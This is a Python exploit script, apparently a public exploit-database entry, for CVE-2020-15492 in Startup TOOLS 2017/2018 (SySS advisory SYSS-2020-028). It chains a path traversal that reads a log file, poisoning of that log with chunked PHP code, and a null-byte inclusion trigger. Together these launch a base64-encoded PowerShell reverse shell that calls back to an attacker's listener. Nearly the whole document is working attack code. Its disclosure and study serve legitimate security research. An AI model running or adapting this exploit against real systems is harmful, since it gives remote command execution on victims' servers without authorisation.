#!/usr/bin/env python
# Exploit Title: Startup TOOLS Path Traversal (RCE)
# Date: 2020-07-23
# Exploit Author: Patrick Hener, SySS GmbH
# Many credits go to Dr. Benjamin He√ü, SySS GmbH for helping with php oddities and the powershell payload
# Advisory: SYSS-2020-028 (https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-028.txt)
# Vendor Homepage: https://www.inneo.co.uk/en/home.html
# Version: Startup TOOLS 2017/2018
# Tested on: Windows 10 x64
# CVE : CVE-2020-15492
# Requirements: netcat listener running

import urllib
import requests
import re
import base64
import os
import sys

# Setup of args
if len(sys.argv) < 4:
    print(
        f"usage: python {sys.argv[0]} lhost[192.168.x.x] lport[4444] url[http://ip:85] install_dir['C:\\\\Program Files(x86)\\\\stools']")
    sys.exit(0)

lhost = sys.argv[1]
lport = sys.argv[2]
url = sys.argv[3]
if len(sys.argv) == 4:
    install_dir = "PROGRA~2/stools"
else:
    dir_input = sys.argv[4]
    install_dir = dir_input.split("\\")
    install_dir.pop(0)
    install_dir = "/".join(install_dir)

# Payload definition (Powershell reverse shell one liner)
payload = '$client = New-Object System.Net.Sockets.TCPClient("' + lhost + '",' + lport + ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
# Convert to base64 UTF-16LE:
payload_bytes = payload.encode('utf-16le')
payload_encoded = base64.b64encode(payload_bytes)
payload_encoded_string = payload_encoded.decode('utf-8')
# In webshell we would issue: powershell.exe -exec bypass -EncodedCommand <encoded_payload>
payload_final = f"powershell.exe -exec bypass -EncodedCommand {payload_encoded_string}"

# Traversal to root - default depth would be 4
traversal = "/../../../../../../../../../../"

def read_file(path):
    response = urllib.request.urlopen(f"{url}{traversal}{path}")

    return response


def poison(path):
    try:
        response = urllib.request.urlopen(f"{url}{traversal}{path}")
    except urllib.error.HTTPError:
        print(f"[+] Poisoned: {path}")


def parse_hostname(body):
    regex = r"Service hostname:.*"
    hostname = re.findall(regex, body)
    hostname = hostname[0].split(':')
    hostname = hostname[1].strip(" ")
    hostname = hostname.rstrip()

    return hostname


if __name__ == "__main__":
    print(f"[*] Attacking target {url} with assumed install path {install_dir}")
    # Stage 1  - find directory and get sut_server.log
    print(f"[*] Trying to read 'sut_server.log' to receive hostname of target at {url}{traversal}{install_dir}/software/LOG/sut_server.log")
    try:
        log_response = read_file(f"{install_dir}/software/LOG/sut_server.log")
        body = log_response.read().decode(errors="ignore")
    except urllib.error.HTTPError as e:
        print(f"[-] {e}")
        sys.exit(f"[-] It looks like {url}{traversal}{install_dir} is not there. Provide install_dir to try via args.")
    # Stage 2 - parse hostname from response body
    hostname = parse_hostname(body)
    print(f"[+] Hostname of target is: {hostname}")
    # Stage 3 - poison log with php payload
    # Special about that is the length of payload junk has max restriction of about 200 characters
    # Thus we are splitting up the payload escaping the trash we don't need like
    # the 'n' is nesessary to escape DRIVE:\ which will be DRIVE:\n then
    # <?php $cmd=''; $foo= '
    # n'; $cmd.="part1"; $foo='
    # n'; $cmd.="part2"; $foo='
    #  ....
    # n'; system(cmd); ?>
    print(f"[*] Poisoning Log with payload")
    # First request to start php
    poison_response = poison(urllib.parse.quote("<?php $cmd= ''; $foo='"))
    # Loop over junks of payload
    offset = 0
    while offset < len(payload_final):
        pre = "n'; $cmd.='"
        post = "'; $foo='"
        payload = payload_final[offset:offset+150-len(pre)-len(post)]
        poison_path = f"{pre}{payload}{post}"
        poison_response = poison(urllib.parse.quote(poison_path))
        offset += 150-len(pre)-len(post)
    # Last request to close off php
    poison_response = poison(urllib.parse.quote("n'; system($cmd); die; ?>"))
    # Stage 4 - Trigger reverse shell by accessing logfile and tricking the server via the \0 to process it in the PHP engine
    log_file = f"{url}{traversal}{install_dir}/software/LOG/sut_server_{hostname}.log\\0.php"
    print(f"[*] Triggering inclusion of {log_file}")
    print("[*] Be sure to have your netcat listener ready at this point")
    try:
        trigger_response = urllib.request.urlopen(log_file)
    except urllib.error.HTTPError:
        sys.exit("[*] Enjoy your shell, good sir.")
